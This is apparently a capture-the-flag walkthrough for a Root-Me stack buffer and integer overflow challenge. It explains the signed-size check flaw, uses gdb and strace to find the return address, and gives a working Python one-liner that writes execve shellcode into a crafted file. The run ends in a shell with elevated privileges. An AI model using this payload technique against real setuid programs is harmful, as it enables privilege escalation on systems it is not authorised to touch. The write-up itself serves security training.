# ELF x86 - Stack buffer and integer overflow
https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-and-integer-overflow
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 No 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch11@challenge02.root-me.org    
Username	app-systeme-ch11
Password	app-systeme-ch11
```
After looking a bit at the source code (and the title name), one can see a vulnerability in the following code:

```c
int size;  

if(read(fd, &size, sizeof(int)) != sizeof(int))
{
  printf("[-] File too short.\n");
  exit(0);
}
if(size >= BUFFER)
{
  printf("[-] Path too long.\n");
  exit(0);
}
```
The vulnerability is the signing of the variable _size_. Because it's a signed int variable, 0xffffffff equals to -1.<br>
Therefore, if an attacker (us) specifies a file with 0xffffffff as the first 4 bytes, he'll be able to read and write 0xffffffff bytes (which is more than enough to overflow the 128 bytes buffer).<br><br>

So let's craft a file that will look like the following:
```
   +------------+---------+-----------+-------------------+--------------------------+
   | 0xffffffff | "/" (*) | SHELLCODE | JUNK for overflow | address of the shellcode |
   +------------+---------+-----------+-------------------+--------------------------+
   
   (*) For passing the if at line 35.
```
With a bit of guessing, one can find out the the offset to the **eip** in stack is 140 bytes after the "/" character.
So out exploit should look like the following:
```
   +------------+---------+--------------------+--------------------------------+--------------------------+
   | 0xffffffff | "/" (*) | 28 bytes SHELLCODE | 112 bytes of JUNK for overflow | address of the shellcode |
   +------------+---------+--------------------+--------------------------------+--------------------------+
   
   (*) For passing the if at line 35.
```
Now let's find out the address to the shellcode. According to gdb:
```gdb
(gdb) break *0x08048612
Breakpoint 1 at 0x8048612: file binary11.c, line 33.
(gdb) run /tmp/badfile
Starting program: /challenge/app-systeme/ch11/ch11 /tmp/badfile

Breakpoint 1, 0x08048612 in read_file (fd=3) at binary11.c:33
33	binary11.c: No such file or directory.
(gdb) info reg
eax            0xbffffabf	-1073743169
ecx            0xbffffab8	-1073743176
edx            0x4	4
ebx            0x80	128
esp            0xbffffaa0	0xbffffaa0
ebp            0xbffffb48	0xbffffb48
esi            0x0	0
edi            0xbffffb40	-1073743040
eip            0x8048612	0x8048612 <read_file+221>
eflags         0x282	[ SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
The first byte '/' is read into 0xbffffabf. So the shellcode is probably at 0xbffffac0 right? Well, apparently not:
```sh
app-systeme-ch11@challenge02:~$ python -c "print '\xff\xff\xff\xff' + '/' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*117 + '\xc0\xfa\xff\xbf' " > /tmp/badfile
app-systeme-ch11@challenge02:~$ ./ch11 /tmp/badfile
[+] The pathname is : /1�Ph//shh/bin��PS���
                                           AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����

Segmentation fault
app-systeme-ch11@challenge02:~$ strace ./ch11 /tmp/badfile
[...snip...]
open("/tmp/badfile", O_RDONLY)          = 3
read(3, "\377\377\377\377", 4)          = 4
read(3, "/", 1)                         = 1
read(3, "1", 1)                         = 1
[...snip...]
write(1, "[+] The pathname is : /1\300Ph//shh"..., 168[+] The pathname is : /1�Ph//shh/bin��PS���
                                                                                                 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
) = 168
write(1, "\n", 1
)                       = 1
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xfadf08ad} ---
+++ killed by SIGSEGV +++
Segmentation fault
```
It happens because the addresses are different between inside and outside of gdb (someone told me it's because the additional environment variables gdb sets).<br>
So to come around it, and find the actual address of the shellcode outside gdb, one can use the _-e_ switch of the **strace** tool.<br>
The _-e_ switch enables one to set an expression which will affect the tool's output. For example, for seeing the second argument of **read** as an address instead of the string.<br>
So to find out the shellcode's address, one can use "-e raw=read" and see the following output:
```sh
app-systeme-ch11@challenge02:~$ strace -e raw=read ./ch11 /tmp/badfile
[...snip...]
open("/tmp/badfile", O_RDONLY)          = 3
read(0x3, 0xbffffad8, 0x4)              = 0x4
read(0x3, 0xbffffadf, 0x1)              = 0x1
read(0x3, 0xbffffae0, 0x1)              = 0x1
[...snip...]
write(1, "[+] The pathname is : /1\300Ph//shh"..., 168[+] The pathname is : /1�Ph//shh/bin��PS���
                                                                                                 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
) = 168
write(1, "\n", 1
)                       = 1
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xfadf08ad} ---
+++ killed by SIGSEGV +++
Segmentation fault
```
It looks like the address of the shellcode is 0xbffffae0 and not 0xbffffac0.<br> 
Once changing it, one can get the following output:
```sh
app-systeme-ch11@challenge02:~$ python -c "print '\xff\xff\xff\xff' + '/' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*117 + '\xe0\xfa\xff\xbf' " > /tmp/badfile
app-systeme-ch11@challenge02:~$ ./ch11 /tmp/badfile
[+] The pathname is : /1�Ph//shh/bin��PS���
                                           AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����

$ id
uid=1111(app-systeme-ch11) gid=1111(app-systeme-ch11) euid=1211(app-systeme-ch11-cracked) groups=1211(app-systeme-ch11-cracked),100(users),1111(app-systeme-ch11)
$ cat .passwd
<censored>
```

